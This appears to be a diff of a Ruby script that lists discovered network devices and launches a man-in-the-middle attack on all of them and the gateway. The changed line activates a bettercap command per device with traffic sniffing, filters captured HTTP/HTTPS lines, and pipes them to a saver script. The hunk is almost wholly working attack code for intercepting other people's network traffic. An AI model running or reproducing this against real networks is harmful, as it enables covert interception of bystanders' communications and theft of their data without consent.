@@ -77,6 +77,5 @@ puts "---- NEW DEVICES LIST----"
 Devices.each{|a| puts a}
 
 puts " Performing MITM attack against all device and the gateway"
-#Devices.each{ |device| fork{exec("sudo bettercap -G "+gateway_ip+" --target "+device.ip.to_s+" --no-discovery  --sniffer")}  }
-
+Devices.each{ |device| fork{exec("sudo bettercap -G "+gateway_ip+" --target "+device.ip.to_s+" --no-discovery  --sniffer | grep \"https:\|http:\"  |ruby saver.rb")}  }
 #fork{exec("ls")}
